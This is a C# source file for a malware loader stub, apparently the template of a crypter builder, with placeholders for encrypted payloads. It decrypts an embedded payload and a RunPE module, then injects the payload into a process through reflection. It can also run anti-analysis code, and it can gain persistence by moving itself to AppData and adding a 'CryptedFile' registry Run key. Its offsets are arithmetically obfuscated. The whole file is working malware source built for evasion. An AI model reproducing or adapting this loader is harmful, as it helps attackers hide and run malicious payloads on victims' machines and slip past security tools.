using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

[assembly: AssemblyTitle("#TITLE")]
[assembly: AssemblyDescription("#DESCRIPTIONS")]
[assembly: AssemblyCompany("#COMPANY")]
[assembly: AssemblyProduct("#PRODUCT")]
[assembly: AssemblyCopyright("#COPYRIGHT")]
[assembly: AssemblyTrademark("#TRADEMARK")]
[assembly: AssemblyVersion("997" + "." + "998" + "." + "999" + "." + "1000")]
[assembly: AssemblyFileVersion("997" + "." + "998" + "." + "999" + "." + "1000")]
namespace LoaderStub
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Conditions();
            string passwordStub = "#PASSWORD_LOAD_BASE64#";
            string path = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#Injection");
            byte[] stubBytes = Encryption.Decompress(Encryption.AES_Decrypt(Convert.FromBase64String("#STUB_LOAD_BASE64#"),passwordStub));
            LoadPayloadInMemory(stubBytes,path);
        }

        static void LoadPayloadInMemory(byte [] fileByteDec,string process)
        {
            string passwordRunpe = "#PASSWORD_RUNPE#";
            string base64RunPe = "#RUNPE#";
            Assembly runpeLoader = Assembly.Load(
                Encryption.Decompress(Encryption.AES_Decrypt(Convert.FromBase64String(base64RunPe),
                    passwordRunpe)));
            string nameSpace = "#NAMESPACE#";
            string cLass = "#CLASSE";
            string method = "#METHODS";
            MethodInfo mi = runpeLoader.GetType(nameSpace + "." + cLass).GetMethod(method);
            object[] parametre = { process, fileByteDec };
            if (mi != null) mi.Invoke(null, parametre);
        }

        static void Conditions()
        {
            string antiAnalysis = "#ANTI_FALSE#";
            if (antiAnalysis == "#ANTI_TRUE#")
            {
                AntiAnalysis.Run();
            }
            string startup = "#STARTUP_FALSE#";
            if (startup == "#STARTUP_TRUE#")
            {
                Startup.AddToStartup();
            }
        }
    }

    class AntiAnalysis
    {
        public static void Run()
        {
            string passwordAntiAnalysis = "#PASSWORD_ANTI_ANALYSIS#";
            byte[] AntiAnalysisBytes = Encryption.Decompress(Encryption.AES_Decrypt(Convert.FromBase64String("#BASE64_ANTI_ANALYSIS#"),passwordAntiAnalysis));
            Assembly.Load(AntiAnalysisBytes).EntryPoint.Invoke(null,null);

        }
    }
    class Startup
    {
        public static void AddToStartup()
        {
            string pathDestination = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +"\\"+ Path.GetFileName(Application.ExecutablePath);
            
            File.Move(Application.ExecutablePath,pathDestination);
            RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            Key.SetValue("CryptedFile", pathDestination);
        }
    }

    class Encryption
    {
        public static byte[] AES_Decrypt(byte[] payload, string key)
        {
            AesManaged aes256 = new AesManaged();
            MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider();
            aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));
            aes256.Mode = CipherMode.ECB;
            byte[] decrypt = aes256.CreateDecryptor().TransformFinalBlock(payload, 50 - 50, payload.Length);
            return decrypt;
        }

        public static byte[] Decompress(byte[] decompressData)
        {
            MemoryStream decompressMemoryStream = new MemoryStream();
            IntPtr decompressLength = (IntPtr)BitConverter.ToInt32(decompressData, 200 - 50 * 4);
            decompressMemoryStream.Write(decompressData, 4 * 1, decompressData.Length - 8 / 2);
            byte[] decompressBuffer = new byte[(int)decompressLength];
            decompressMemoryStream.Position = 700 + 300 - 100 * 10;
            GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress);
            int read = decompressZip.Read(decompressBuffer, 100 - 50 * 2, decompressBuffer.Length);
            return decompressBuffer;
        }
    }
}